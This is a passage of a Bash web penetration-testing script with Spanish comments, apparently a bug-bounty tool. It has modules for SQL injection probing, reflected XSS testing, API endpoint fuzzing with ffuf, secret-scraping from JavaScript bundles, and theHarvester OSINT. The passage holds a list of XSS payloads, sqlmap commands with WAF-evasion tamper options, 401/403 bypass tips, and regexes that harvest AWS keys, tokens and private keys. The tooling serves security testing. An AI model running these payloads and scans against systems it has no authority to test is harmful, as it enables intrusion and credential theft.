        [[ ${#INTEL_EXTRA_PAYLOADS_SQLI[@]} -gt 0 ]] &&             intel_log "SQLi: +${#INTEL_EXTRA_PAYLOADS_SQLI[@]} payloads custom del usuario"

        for payload in "${ALL_PAYLOADS[@]}"; do
            local encoded_payload
            encoded_payload=$(python3 -c "import urllib.parse, sys; print(urllib.parse.quote(sys.argv[1]))" "$payload" 2>/dev/null || echo "$payload")

            local test_url="${base_param}?${params}${encoded_payload}"
            local response
            response=$(curl -skL --max-time 8 \
                -H "User-Agent: Mozilla/5.0 (compatible; WriestTavo/2.0)" \
                "${test_url}" 2>/dev/null | tr '[:upper:]' '[:lower:]')

            for err_pattern in "${DB_ERRORS[@]}"; do
                if echo "$response" | grep -qiE "$err_pattern"; then
                    local hit="⚠ SQLi POTENCIAL: ${test_url} → Trigger: '${err_pattern}'"
                    echo -e "  ${C_RED}${hit}${C_RST}"
                    echo "$hit" >> "${output_file}"
                    findings_detail+="<tr><td class='vuln'>POTENCIAL</td><td>${test_url}</td><td><code>${payload}</code></td><td>${err_pattern}</td></tr>"
                    ((vuln_count++)) || true
                    break
                fi
            done

            # Detectar time-based (SLEEP)
            if [[ "$payload" == *"SLEEP"* ]]; then
                local start_time end_time elapsed
                start_time=$(date +%s)
                curl -skL --max-time 10 \
                    -H "User-Agent: Mozilla/5.0 (compatible; WriestTavo/2.0)" \
                    "${test_url}" >/dev/null 2>&1
                end_time=$(date +%s)
                elapsed=$(( end_time - start_time ))
                if (( elapsed >= 2 )); then
                    local time_hit="⚠ TIME-BASED SQLi: ${test_url} → Delay: ${elapsed}s"
                    echo -e "  ${C_RED}${time_hit}${C_RST}"
                    echo "$time_hit" >> "${output_file}"
                    findings_detail+="<tr><td class='critical'>TIME-BASED</td><td>${test_url}</td><td><code>${payload}</code></td><td>Delay ${elapsed}s</td></tr>"
                    ((vuln_count++)) || true
                fi
            fi
        done
    done

    echo
    if (( vuln_count > 0 )); then
        INTEL_SQLI_FOUND=true
        # Registrar payloads efectivos para los 3 reportes
        for vuln_row in $(echo "$findings_detail" | grep -oP '(?<=<code>)[^<]+(?=</code>)'); do
            register_payload "SQLi" "$vuln_row" "Ver sqli_results.txt" "Error/delay detectado"
        done
        # Construir comando sqlmap inteligente basado en tecnología detectada
        local sqlmap_extra=""
        [[ "$db_type" == "mysql" ]]      && sqlmap_extra="--dbms=mysql"
        [[ "$db_type" == "postgresql" ]] && sqlmap_extra="--dbms=postgresql"
        [[ "$db_type" == "mssql" ]]      && sqlmap_extra="--dbms=mssql"
        [[ "$INTEL_WAF_DETECTED" == "true" ]] && sqlmap_extra+=" --tamper=between,charencode,randomcase --level=5 --risk=3"

        add_finding "CRÍTICO" "SQL Injection — ${vuln_count} Indicios Encontrados" \
            "<table class='vuln-table'><tr><th>Tipo</th><th>URL</th><th>Payload</th><th>Trigger</th></tr>${findings_detail}</table><br><b>Siguiente paso recomendado:</b><br><code>sqlmap -u "URL_VULNERABLE" --dbs --batch ${sqlmap_extra}</code>"
        intel_log "SQLi confirmado → XSS usará estas URLs también | searchsploit buscará exploits de ${db_type}"
    else
        ok "No se detectaron indicios obvios de SQLi básico."
        add_finding "INFO" "SQL Injection" "No se detectaron errores de BD con payloads básicos. Recomienda: sqlmap completo."
    fi

    [[ -f "$output_file" ]] && ok "Resultados SQLi: ${output_file}"
    echo
}

# ─── MÓDULO 14: XSS BÁSICO ──────────────────────────────────────
modulo_xss() {
    [[ ${#WEB_PORTS[@]} -eq 0 ]] && warn "Sin puertos web. Saltando XSS." && return

    log "MÓDULO 14: XSS — Cross-Site Scripting Básico (curl)"
    tip "Pruebas de reflexión de payloads. Un XSS real requiere navegador para ejecutar."

    local proto="http"
    local port="${WEB_PORTS[0]}"
    [[ "$port" == "443" || "$port" == "8443" ]] && proto="https"
    local base_url="${ORIGINAL_URL:-${proto}://${TARGET}}"
    local output_file="${OUTPUT_DIR}/web/xss_results.txt"
    local vuln_count=0
    local findings_detail=""

    # Canary token único para esta sesión
    local CANARY="WTavo$(date +%s)"

    # Payloads XSS — del más simple al más evasivo
    local XSS_PAYLOADS=(
        "<script>alert('${CANARY}')</script>"
        "<img src=x onerror=alert('${CANARY}')>"
        "<svg onload=alert('${CANARY}')>"
        "javascript:alert('${CANARY}')"
        "'><script>alert('${CANARY}')</script>"
        "\"><img src=x onerror=alert('${CANARY}')>"
        "<body onload=alert('${CANARY}')>"
        "<iframe src=\"javascript:alert('${CANARY}')\"></iframe>"
        "<!--<script>alert('${CANARY}')</script>-->"
        "<ScRiPt>alert('${CANARY}')</ScRiPt>"
        "%3Cscript%3Ealert('${CANARY}')%3C/script%3E"
        "<img src=\"\" onerror=\"alert('${CANARY}')\">"
        "<details open ontoggle=alert('${CANARY}')>"
        "<video><source onerror=alert('${CANARY}')>"
    )

    echo -e "  Base URL: ${C_CYN}${base_url}${C_RST}"
    echo -e "  Canary token: ${C_YEL}${CANARY}${C_RST}"
    echo -e "  Payloads: ${#XSS_PAYLOADS[@]}"
    echo

    # Extraer formularios y parámetros GET
    local page_html
    page_html=$(curl -skL --max-time 10 \
        -H "User-Agent: Mozilla/5.0 (compatible; WriestTavo/2.0)" \
        "${base_url}" 2>/dev/null)

    local page_links
    page_links=$(echo "$page_html" | \
        grep -oE '(href|action)="[^"]*"' | \
        grep -oE '"[^"]*"' | tr -d '"' | \
        grep '?' | sed "s|^/|${base_url}/|g" | head -10)

    # Incluir la URL base con params de prueba
    local test_urls=("${base_url}/?q=TEST" "${base_url}/search?q=TEST" "${base_url}/?s=TEST")
    while IFS= read -r u; do [[ -n "$u" ]] && test_urls+=("$u"); done <<< "$page_links"

    for url_template in "${test_urls[@]}"; do
        local base_part
        base_part=$(echo "$url_template" | cut -d'?' -f1)
        local param_part
        param_part=$(echo "$url_template" | cut -d'?' -f2 | sed 's/=.*//')
        [[ -z "$param_part" ]] && param_part="q"

        echo -e "  ${C_DIM}Testeando:${C_RST} ${C_CYN}${base_part}?${param_part}=...${C_RST}"

        local ALL_XSS=("${XSS_PAYLOADS[@]}" "${INTEL_EXTRA_PAYLOADS_XSS[@]}")
        [[ ${#INTEL_EXTRA_PAYLOADS_XSS[@]} -gt 0 ]] &&             intel_log "XSS: +${#INTEL_EXTRA_PAYLOADS_XSS[@]} payloads custom"

        for payload in "${ALL_XSS[@]}"; do
            local encoded
            encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''${payload}'''))" 2>/dev/null || echo "$payload")

            local test_url="${base_part}?${param_part}=${encoded}"
            local response
            response=$(curl -skL --max-time 8 \
                -H "User-Agent: Mozilla/5.0 (compatible; WriestTavo/2.0)" \
                "${test_url}" 2>/dev/null)

            # Verificar si el CANARY se refleja sin encoding
            if echo "$response" | grep -q "${CANARY}"; then
                # Verificar si está dentro de un contexto ejecutable
                local context="reflexión"
                echo "$response" | grep -q "<script>" && context="dentro de <script>"
                echo "$response" | grep -q "onerror=" && context="dentro de atributo evento"
                echo "$response" | grep -q "onload=" && context="dentro de onload"

                local hit="⚠ XSS REFLEJADO: ${base_part}?${param_part}= | Payload: ${payload} | Contexto: ${context}"
                echo -e "  ${C_RED}${hit}${C_RST}"
                echo "$hit" >> "${output_file}"
                local safe_payload="${payload//</LESSTHAN}"; safe_payload="${safe_payload//>/GREATERTHAN}"
                findings_detail+="<tr><td class='critical'>REFLEJADO</td><td>${base_part}?${param_part}=</td><td><code>${safe_payload}</code></td><td>${context}</td></tr>"
                ((vuln_count++)) || true
                break  # Un hit por URL es suficiente para señalar
            fi

            # Verificar si el payload llega parcialmente (posible bypass de filtro)
            if echo "$response" | grep -qiE "alert|onerror|onload|<script|<img|<svg"; then
                if echo "$response" | grep -q "WTavo"; then
                    warn "Reflexión parcial detectada en: ${test_url}"
                    findings_detail+="<tr><td class='medium'>PARCIAL</td><td>${base_part}?${param_part}=</td><td><code>${payload}</code></td><td>Reflexion parcial - revisar manualmente</td></tr>"
                fi
            fi
        done

        # Test XSS en headers (User-Agent, Referer, X-Forwarded-For)
        local header_response
        header_response=$(curl -skL --max-time 8 \
            -H "User-Agent: <script>alert('${CANARY}')</script>" \
            -H "Referer: <script>alert('${CANARY}')</script>" \
            -H "X-Forwarded-For: <script>alert('${CANARY}')</script>" \
            "${base_url}" 2>/dev/null)

        if echo "$header_response" | grep -q "${CANARY}"; then
            local h_hit="⚠ XSS EN HEADER: ${base_url} → Reflexión via HTTP Header"
            echo -e "  ${C_RED}${h_hit}${C_RST}"
            echo "$h_hit" >> "${output_file}"
            findings_detail+="<tr><td class='critical'>HEADER-BASED</td><td>${base_url}</td><td><code>Header injection</code></td><td>User-Agent / Referer / X-Forwarded-For</td></tr>"
            ((vuln_count++)) || true
        fi
    done

    # POST form testing
    local forms
    # Extract form action URLs from page HTML
    local forms_raw
    forms_raw=$(echo "$page_html" | grep -oi "action='[^']*'\|action=\"[^\"]*\"" | grep -oE "['\"][^'\"]+['\"]" | tr -d "'\""  | head -5)
    local forms="$forms_raw" 
    if [[ -n "$forms" ]]; then
        echo
        log "Testeando formularios POST para XSS..."
        while IFS= read -r form_action; do
            [[ -z "$form_action" ]] && continue
            [[ "$form_action" != http* ]] && form_action="${base_url}${form_action}"
            local post_resp
            post_resp=$(curl -skL --max-time 8 \
                -X POST \
                -d "q=<script>alert('${CANARY}')</script>&search=<img src=x onerror=alert('${CANARY}')>&input=${CANARY}" \
                -H "Content-Type: application/x-www-form-urlencoded" \
                "${form_action}" 2>/dev/null)

            if echo "$post_resp" | grep -q "${CANARY}"; then
                local post_hit="⚠ XSS POST: ${form_action}"
                echo -e "  ${C_RED}${post_hit}${C_RST}"
                echo "$post_hit" >> "${output_file}"
                findings_detail+="<tr><td class='critical'>POST FORM</td><td>${form_action}</td><td><code>POST body injection</code></td><td>Reflexión en respuesta POST</td></tr>"
                ((vuln_count++)) || true
            fi
        done <<< "$forms"
    fi

    echo
    if (( vuln_count > 0 )); then
        add_finding "CRÍTICO" "XSS — ${vuln_count} Puntos de Inyección Detectados" \
            "<table class='vuln-table'><tr><th>Tipo</th><th>URL</th><th>Payload</th><th>Contexto</th></tr>${findings_detail}</table><br><b>Siguiente paso:</b> Confirmar en navegador real. Usar Burp Suite para análisis profundo."
    else
        ok "No se detectó XSS reflejado básico."
        add_finding "INFO" "XSS" "No se detectó reflexión de payloads básicos. Recomienda: Burp Suite Active Scan para XSS almacenado y DOM-based."
    fi

    [[ -f "$output_file" ]] && ok "Resultados XSS: ${output_file}"
    echo
}

# ─── MÓDULO 15: ENDPOINT & API DISCOVERY ────────────────────────
modulo_endpoints() {
    [[ ${#WEB_PORTS[@]} -eq 0 ]] && warn "Sin puertos web. Saltando endpoints." && return
    command -v ffuf >/dev/null 2>&1 || { warn "ffuf no disponible. Instala: sudo apt install ffuf"; return; }

    log "MÓDULO 15: Endpoint & API Discovery (ffuf)"
    tip "APIs modernas usan rutas como /api/v1/, /graphql, /swagger, /actuator — muy comunes en bug bounty."

    local proto="http"
    local port="${WEB_PORTS[0]}"
    [[ "$port" == "443" || "$port" == "8443" ]] && proto="https"
    local base_url="${ORIGINAL_URL:-${proto}://${TARGET}}"
    local output_dir="${OUTPUT_DIR}/web/endpoints"
    mkdir -p "$output_dir"

    # ── Wordlist de APIs y endpoints modernos ──
    local API_WORDLIST="${output_dir}/api_endpoints.txt"
    cat > "$API_WORDLIST" << 'WORDLIST'
api
api/v1
api/v2
api/v3
api/user
api/users
api/auth
api/login
api/register
api/logout
api/token
api/refresh
api/admin
api/config
api/settings
api/data
api/search
api/upload
api/download
api/status
api/health
api/info
api/version
api/debug
graphql
graphiql
playground
swagger
swagger-ui
swagger-ui.html
swagger.json
swagger.yaml
openapi.json
openapi.yaml
api-docs
api-docs.json
v1
v2
v3
rest
rest/api
rpc
jsonrpc
soap
wsdl
actuator
actuator/health
actuator/info
actuator/env
actuator/beans
actuator/mappings
actuator/metrics
actuator/dump
actuator/trace
actuator/logfile
actuator/heapdump
.well-known
.well-known/security.txt
.well-known/openid-configuration
robots.txt
sitemap.xml
sitemap_index.xml
security.txt
humans.txt
crossdomain.xml
clientaccesspolicy.xml
feed
feed.xml
rss
rss.xml
atom.xml
wp-json
wp-json/wp/v2
wp-login.php
wp-admin
admin
admin/api
dashboard
panel
console
manager
portal
user
users
profile
account
auth
login
logout
register
signup
signin
reset
forgot
oauth
oauth/token
oauth/authorize
callback
redirect
webhook
webhooks
upload
uploads
files
static
assets
media
images
cdn
socket.io
ws
websocket
health
ping
status
metrics
monitor
debug
test
dev
staging
internal
private
backup
export
import
WORDLIST

    echo -e "  Base URL: ${C_CYN}${base_url}${C_RST}"
    local wl_count; wl_count=$(wc -l < "$API_WORDLIST")
    echo -e "  Endpoints en wordlist: ${wl_count}"
    echo

    local ffuf_output="${output_dir}/ffuf_endpoints.json"
    cmd_show "ffuf -u ${base_url}/FUZZ -w ${API_WORDLIST} -mc 200,201,204,301,302,401,403,405 -t 30 -o ${ffuf_output} -of json -s"

    ffuf -u "${base_url}/FUZZ" \
        -w "$API_WORDLIST" \
        -mc 200,201,204,301,302,401,403,405 \
        -H "User-Agent: Mozilla/5.0 (compatible; WriestTavo/2.0)" \
        -H "Accept: application/json, text/html" \
        -t 30 \
        -o "${ffuf_output}" \
        -of json \
        -s 2>/dev/null

    # Parsear resultados
    if [[ -f "$ffuf_output" ]]; then
        local results_txt="${output_dir}/endpoints_found.txt"
        local ffuf_out_copy="${ffuf_output}"
        local results_copy="${results_txt}"
        # Parse ffuf JSON output
        local results_txt="${output_dir}/endpoints_found.txt"
        local found_count=0
        if command -v jq >/dev/null 2>&1; then
            jq -r '.results[] | "[\(.status)] \(.url) (size:\(.length))"' "${ffuf_output}" 2>/dev/null | tee "${results_txt}"
            found_count=$(jq '.results | length' "${ffuf_output}" 2>/dev/null || echo 0)
        else
            found_count=$(grep -c "url" "${ffuf_output}" 2>/dev/null || echo 0)
            grep -oE '"url":"[^"]*"' "${ffuf_output}" 2>/dev/null | cut -d'"' -f4 > "${results_txt}" || true
        fi

        ok "Endpoints/APIs encontrados: ${found_count}"

        if (( found_count > 0 )); then
            # Clasificar hallazgos por severidad
            local critical_eps=""
            local interesting_eps=""

            if [[ -f "$results_txt" ]]; then
                # Endpoints críticos
                critical_eps=$(grep -iE "admin|actuator|debug|config|env|heapdump|dump|backup|internal|private|swagger|graphql|api-docs" "$results_txt" 2>/dev/null)
                # Con 401/403 (existentes pero protegidos)
                interesting_eps=$(grep -E "\[401\]|\[403\]" "$results_txt" 2>/dev/null | head -20)

                [[ -n "$critical_eps" ]] && add_finding "ALTO" \
                    "Endpoints Críticos Encontrados" \
                    "<pre>${critical_eps}</pre><br><b>Tip:</b> Endpoints como /actuator, /admin, /debug pueden exponer datos sensibles."

                [[ -n "$interesting_eps" ]] && add_finding "MEDIO" \
                    "Endpoints Protegidos (401/403) — Posible Bypass" \
                    "<pre>${interesting_eps}</pre><br><b>Tip:</b> Prueba bypass con: X-Original-URL, X-Rewrite-URL, ..;/ path traversal."

                local all_eps
                all_eps=$(cat "$results_txt")
                add_finding "INFO" "Todos los Endpoints Encontrados (${found_count})" "<pre>${all_eps}</pre>"
            fi
        fi
    fi

    # ── Detección especial: GraphQL ──
    echo
    log "Verificando GraphQL..."
    local gql_endpoints=("/graphql" "/graphiql" "/playground" "/api/graphql" "/v1/graphql")
    local gql_found=""
    for ep in "${gql_endpoints[@]}"; do
        local gql_url="${base_url}${ep}"
        local gql_resp
        gql_resp=$(curl -skL --max-time 8 \
            -X POST \
            -H "Content-Type: application/json" \
            -d '{"query":"{__typename}"}' \
            "${gql_url}" 2>/dev/null)

        if echo "$gql_resp" | grep -qiE "__typename|data|graphql|errors"; then
            warn "GraphQL DETECTADO: ${gql_url}"
            gql_found+="${gql_url}\n"
            INTEL_GRAPHQL_URL="${gql_url}"
            INTEL_API_ENDPOINTS+=("${gql_url}")
            intel_log "GraphQL guardado → SQLi/XSS intentarán inyección en queries GraphQL"
            add_finding "ALTO" "GraphQL Endpoint Detectado" \
                "URL: <b>${gql_url}</b><br>Respuesta sugiere GraphQL activo.<br><b>Siguiente paso:</b> graphql-cop -t ${gql_url} o InQL en Burp."
        fi
    done

    # ── Detección: Swagger / OpenAPI ──
    echo
    log "Verificando Swagger / OpenAPI docs..."
    local swagger_eps=("/swagger.json" "/swagger.yaml" "/openapi.json" "/api-docs" "/swagger-ui.html" "/v2/api-docs" "/v3/api-docs")
    for ep in "${swagger_eps[@]}"; do
        local sw_url="${base_url}${ep}"
        local sw_status
        sw_status=$(curl -sko /dev/null --max-time 5 -w "%{http_code}" "${sw_url}" 2>/dev/null)
        if [[ "$sw_status" == "200" ]]; then
            ok "Swagger/OpenAPI encontrado: ${sw_url}"
            INTEL_SWAGGER_URL="${sw_url}"
            intel_log "Swagger expuesto → parseando endpoints para SQLi/XSS"
            add_finding "ALTO" "Swagger/API Docs Expuestos Públicamente" \
                "URL: <b>${sw_url}</b><br>Los API docs expuestos revelan todos los endpoints.<br><b>Extraer endpoints:</b> <code>curl -s ${sw_url} | jq -r \'.paths | keys[]\' 2>/dev/null</code>"
        fi
    done
    echo
}

# ─── MÓDULO 16: JS/JSX ANALYSIS ─────────────────────────────────
modulo_js_analysis() {
    [[ ${#WEB_PORTS[@]} -eq 0 ]] && warn "Sin puertos web. Saltando análisis JS." && return

    log "MÓDULO 16: JavaScript / JSX Analysis"
    tip "Las apps modernas (React, Vue, Angular) esconden endpoints, tokens y secrets en sus JS bundles."

    local proto="http"
    local port="${WEB_PORTS[0]}"
    [[ "$port" == "443" || "$port" == "8443" ]] && proto="https"
    local base_url="${ORIGINAL_URL:-${proto}://${TARGET}}"
    local js_dir="${OUTPUT_DIR}/web/js_analysis"
    mkdir -p "$js_dir"

    local vuln_count=0
    local findings_detail=""

    echo -e "  Base URL: ${C_CYN}${base_url}${C_RST}"
    echo

    # ── PASO 1: Descubrir archivos JS en la página ──
    log "Paso 1/4: Descubriendo archivos JS..."
    local page_html
    page_html=$(curl -skL --max-time 15 \
        -H "User-Agent: Mozilla/5.0 (compatible; WriestTavo/2.0)" \
        "${base_url}" 2>/dev/null)

    # Extraer todos los src de scripts
    local js_files
    js_files=$(echo "$page_html" | \
        grep -oE '(src|href)="[^"]*\.js[^"]*"' | \
        grep -oE '"[^"]*"' | tr -d '"' | \
        grep -v "^#" | sort -u)

    # También buscar archivos .js en sourcemaps y webpack
    local sourcemaps
    sourcemaps=$(echo "$page_html" | grep -oE '//# sourceMappingURL=[^\s]+')

    # Rutas comunes de bundles modernos
    local COMMON_JS_PATHS=(
        "/static/js/main.js"
        "/static/js/bundle.js"
        "/static/js/app.js"
        "/assets/index.js"
        "/assets/app.js"
        "/dist/bundle.js"
        "/dist/app.js"
        "/js/app.js"
        "/js/main.js"
        "/build/static/js/main.chunk.js"
        "/chunk.js"
        "/runtime-main.js"
        "/vendor.js"
        "/app.bundle.js"
        "/wp-includes/js/jquery/jquery.min.js"
    )

    local all_js_urls=()
    while IFS= read -r js; do
        [[ -z "$js" ]] && continue
        if [[ "$js" == http* ]]; then
            all_js_urls+=("$js")
        else
            all_js_urls+=("${base_url}/${js#/}")
        fi
    done <<< "$js_files"

    # Probar rutas comunes
    for path in "${COMMON_JS_PATHS[@]}"; do
        local status
        status=$(curl -sko /dev/null --max-time 5 -w "%{http_code}" "${base_url}${path}" 2>/dev/null)
        [[ "$status" == "200" ]] && all_js_urls+=("${base_url}${path}")
    done

    local js_count="${#all_js_urls[@]}"
    ok "Archivos JS encontrados: ${js_count}"

    if (( js_count == 0 )); then
        warn "No se encontraron archivos JS. El site puede usar SSR o no cargar JS externo."
        add_finding "INFO" "JS Analysis" "No se encontraron archivos JavaScript externos accesibles."
        return
    fi

    # ── PASO 2: Descargar y analizar cada JS ──
    log "Paso 2/4: Descargando y analizando archivos JS..."

    # Patrones paralelos: nombres y regex
    local PAT_NAMES=(
        "API Key"
        "Token JWT"
        "AWS Access Key"
        "AWS Secret Key"
        "Google API Key"
        "Firebase URL"
        "Stripe Key"
        "Private Key PEM"
        "Password hardcoded"
        "Token hardcoded"
        "Endpoint interno"
        "MongoDB URI"
        "SQL Connection"
        "Email hardcoded"
        "IP interna"
        "Endpoint API"
        "Ruta sensible"
    )
    local PAT_REGEX=(
        'api[_-]?key[[:space:]]*[:=][[:space:]]*[[:alnum:]_-]{16,}'
        'eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+'
        'AKIA[0-9A-Z]{16}'
        'aws[_-]?secret[_-]?access[_-]?key'
        'AIza[0-9A-Za-z_-]{35}'
        'https://[a-z0-9-]+\.firebaseio\.com'
        'sk_live_[0-9a-zA-Z]{24,}'
        'BEGIN PRIVATE KEY'
        'password[[:space:]]*:[[:space:]]*[^[:space:]]{6,}'
        'auth_token[[:space:]]*=[[:space:]]*[a-zA-Z0-9_-]{20,}'
        'https?://(internal|localhost|127\.0\.0\.1|192\.168\.[0-9]+\.[0-9]+|10\.[0-9]+\.[0-9]+\.[0-9]+)'
        'mongodb://[^[:space:]<>]+'
        'mysql://[^[:space:]<>]+'
        '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
        '192\.168\.[0-9]+\.[0-9]+'
        '/api/v[0-9]/[a-zA-Z0-9/_-]+'
        '/(admin|dashboard|config|debug|secret|private|backup)/'
    )

    local secrets_report=""
    local endpoints_report=""
    local analyzed=0

    for js_url in "${all_js_urls[@]}"; do
        [[ -z "$js_url" ]] && continue
        local js_file_name
        js_file_name=$(echo "$js_url" | sed 's|[/:?=&]|_|g' | tail -c 60)
        local local_js="${js_dir}/${js_file_name}"

        echo -e "  ${C_DIM}Analizando:${C_RST} ${C_CYN}${js_url}${C_RST}"

        curl -skL --max-time 15 \
            -H "User-Agent: Mozilla/5.0 (compatible; WriestTavo/2.0)" \
            "${js_url}" -o "${local_js}" 2>/dev/null

        [[ ! -s "$local_js" ]] && continue
        ((analyzed++)) || true

        local file_size
        file_size=$(du -sh "$local_js" 2>/dev/null | cut -f1)
        echo -e "    ${C_DIM}Tamaño: ${file_size}${C_RST}"

        # Buscar cada patrón (usando arrays paralelos)
        local pat_idx=0
        while [[ $pat_idx -lt ${#PAT_NAMES[@]} ]]; do
            local pattern_name="${PAT_NAMES[$pat_idx]}"
            local pattern="${PAT_REGEX[$pat_idx]}"
            local matches
            matches=$(grep -oiE "$pattern" "$local_js" 2>/dev/null | head -5 | tr '\n' ' ')

            if [[ -n "$matches" ]]; then
                echo -e "    ${C_RED}[!] ${pattern_name}:${C_RST} ${matches:0:100}..."
                ((vuln_count++)) || true

                local severity="ALTO"
                [[ "$pattern_name" == *"AWS"* || "$pattern_name" == *"Private Key"* || "$pattern_name" == *"JWT"* ]] && severity="CRITICO"
                [[ "$pattern_name" == *"Email"* || "$pattern_name" == *"Endpoint API"* ]] && severity="BAJO"
                [[ "$pattern_name" == *"IP interna"* || "$pattern_name" == *"Endpoint interno"* ]] && severity="MEDIO"

                secrets_report+="<tr><td>${severity}</td><td>${js_url}</td><td>${pattern_name}</td><td><code>${matches:0:150}</code></td></tr>"
            fi
            ((pat_idx++)) || true
        done

        # ── Extraer endpoints de la API del JS ──
        local api_endpoints
        api_endpoints=$(grep -oE "/[a-zA-Z0-9/_-]{3,80}" "$local_js" 2>/dev/null | \
            grep -v "^//" | \
            sort -u | head -50)

        if [[ -n "$api_endpoints" ]]; then
            endpoints_report+="<b>${js_url}</b><pre>${api_endpoints}</pre>"
        fi

        # Guardar versión legible (si es minificado, formatear básico)
        # Guardar copia legible básica (sed beautify)
        sed 's/;/;\n/g; s/{/{\n/g; s/}/\n}\n/g' "${local_js}" 2>/dev/null | head -c 500000 > "${local_js}.readable" 2>/dev/null || true
    done

    # ── PASO 3: Source Maps ──
    echo
    log "Paso 3/4: Buscando Source Maps (.map)..."
    local sourcemap_count=0
    for js_url in "${all_js_urls[@]}"; do
        local map_url="${js_url}.map"
        local map_status
        map_status=$(curl -sko /dev/null --max-time 5 -w "%{http_code}" "${map_url}" 2>/dev/null)
        if [[ "$map_status" == "200" ]]; then
            warn "Source Map EXPUESTO: ${map_url}"
            ((sourcemap_count++)) || true
            add_finding "ALTO" "Source Map Expuesto Públicamente" \
                "URL: <b>${map_url}</b><br>Los source maps revelan el código fuente original (incluso TypeScript/JSX sin compilar).<br><b>Herramienta:</b> <code>sourcemapper -url ${map_url} -output ./sourcecode</code>"
        fi
    done
    [[ $sourcemap_count -eq 0 ]] && ok "No se encontraron source maps expuestos."

    # ── PASO 4: Detectar frameworks JS ──
    echo
    log "Paso 4/4: Detectando framework JS..."
    local framework="Desconocido"
    local fw_detail=""

    if [[ -n "$page_html" ]]; then
        echo "$page_html" | grep -qi "react\|__REACT\|data-reactroot\|_react" && framework="React" && fw_detail="React detectado — busca /static/js/ para bundles"
        echo "$page_html" | grep -qi "ng-version\|angular\|__ngContext__" && framework="Angular" && fw_detail="Angular detectado — revisa main.js y environment.ts en source maps"
        echo "$page_html" | grep -qi "__vue\|v-app\|nuxt" && framework="Vue/Nuxt" && fw_detail="Vue detectado — busca api/ en Vuex store"
        echo "$page_html" | grep -qi "next/\|__NEXT_DATA__\|_next/static" && framework="Next.js" && fw_detail="Next.js detectado — revisa /_next/static/chunks/ y /api/ routes"
        echo "$page_html" | grep -qi "gatsby\|___gatsby" && framework="Gatsby" && fw_detail="Gatsby detectado — busca /page-data/app-data.json"
        echo "$page_html" | grep -qi "svelte\|__svelte" && framework="Svelte" && fw_detail="Svelte detectado"
        echo "$page_html" | grep -qi "ember\|Ember\." && framework="Ember.js" && fw_detail="Ember.js detectado"
        echo "$page_html" | grep -qi "window\.wp\|wp-content\|wp-includes" && framework="WordPress+React" && fw_detail="WordPress con Gutenberg/React detectado — revisa wp-json API"
    fi

    if [[ "$framework" != "Desconocido" ]]; then
        ok "Framework detectado: ${C_YEL}${framework}${C_RST}"
        add_finding "INFO" "Framework JS Detectado: ${framework}" "${fw_detail}"
    fi

    # ── Reporte final ──
    echo
    ok "Archivos JS analizados: ${analyzed}"

    if (( vuln_count > 0 )); then
        add_finding "CRÍTICO" "Secretos/Datos Sensibles en JavaScript (${vuln_count} hallazgos)" \
            "<table class='vuln-table'><tr><th>Severidad</th><th>Archivo JS</th><th>Tipo</th><th>Valor (truncado)</th></tr>${secrets_report}</table>"
    else
        ok "No se encontraron secretos obvios en los archivos JS analizados."
        add_finding "INFO" "JS Analysis" "No se encontraron secrets/tokens hardcoded obvios en ${analyzed} archivos JS analizados."
    fi

    if [[ -n "$endpoints_report" ]]; then
        add_finding "MEDIO" "Endpoints Extraídos de Archivos JS" \
            "${endpoints_report}<br><b>Tip:</b> Prueba estos endpoints directamente con curl o Burp Suite."

        # ── INTEL WRITE: registrar endpoints para SQLi/XSS ──
        local js_dir_local="${OUTPUT_DIR}/web/js_analysis"
        while IFS= read -r ep; do
            [[ "$ep" == /api/* || "$ep" == /v[0-9]/* ]] && INTEL_API_ENDPOINTS+=("${base_url}${ep}")
        done < <(find "${js_dir_local}" -name "*.txt" -exec grep -ohE "/[a-zA-Z0-9/_-]{3,60}" {} \; 2>/dev/null | sort -u | head -30)

        intel_log "Endpoints de JS registrados para pruebas: ${#INTEL_API_ENDPOINTS[@]}"
    fi

    ok "Archivos JS descargados en: ${js_dir}/"
    echo
}


# ════════════════════════════════════════════════════════════════
# MÓDULOS v3.0 — NUEVAS HERRAMIENTAS
# ════════════════════════════════════════════════════════════════

# ─── MÓDULO 17: THEHARVESTER — OSINT PASIVO ──────────────────────
modulo_theharvester() {
    is_domain "$TARGET" || { warn "theHarvester requiere dominio, no IP."; return; }
    command -v theHarvester >/dev/null 2>&1 || { warn "theHarvester no disponible: sudo apt install theharvester"; return; }

    log "MÓDULO 17: theHarvester — OSINT Pasivo"
    tip "Recolecta emails, IPs y subdominios sin tocar el target. Safe para Bug Bounty."

    local out_txt="${OUTPUT_DIR}/recon/theharvester.txt"
    cmd_show "theHarvester -d ${TARGET} -b google,bing,crtsh,dnsdumpster,urlscan"

    theHarvester -d "${TARGET}" -b google,bing,crtsh,dnsdumpster,urlscan \
        -f "${OUTPUT_DIR}/recon/theharvester" 2>/dev/null | tee "${out_txt}"

    local emails ips hosts
    emails=$(grep -oE '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' "${out_txt}" 2>/dev/null | sort -u)
    ips=$(grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' "${out_txt}" 2>/dev/null | sort -u | head -30)
    hosts=$(grep -oE "[a-zA-Z0-9._-]+\.${TARGET}" "${out_txt}" 2>/dev/null | sort -u | head -30)

    local email_count=0; local host_count=0
    [[ -n "$emails" ]] && email_count=$(echo "$emails" | wc -l)
    [[ -n "$hosts"  ]] && host_count=$(echo "$hosts"   | wc -l)

    ok "Emails: ${email_count} | Hosts: ${host_count}"

    [[ -n "$emails" ]] && add_finding "MEDIO" \
        "Emails Corporativos Expuestos (${email_count})" \
        "<pre>${emails}</pre>" \
        "4.3" \
        "Evaluar política de exposición de emails. Usar alias en lugar de emails reales en páginas públicas." \
        "Verificar emails en HaveIBeenPwned. Usar para enumeración de usuarios o phishing simulado."

    if [[ -n "$hosts" ]]; then
        add_finding "INFO" "Subdominios via OSINT (${host_count})" "<pre>${hosts}</pre>" \
            "N/A" "Inventariar todos los subdominios activos. Dar de baja los no utilizados." \
            "Verificar cada subdominio con httpx/nmap. Buscar subdomain takeover."
        while IFS= read -r h; do
            [[ -n "$h" ]] && INTEL_SUBDOMAINS+=("$h")
        done <<< "$hosts"
        intel_log "OSINT: ${host_count} subdominios nuevos registrados"
    fi

    [[ -n "$ips" ]] && add_finding "INFO" "IPs Asociadas (OSINT)" "<pre>${ips}</pre>" \
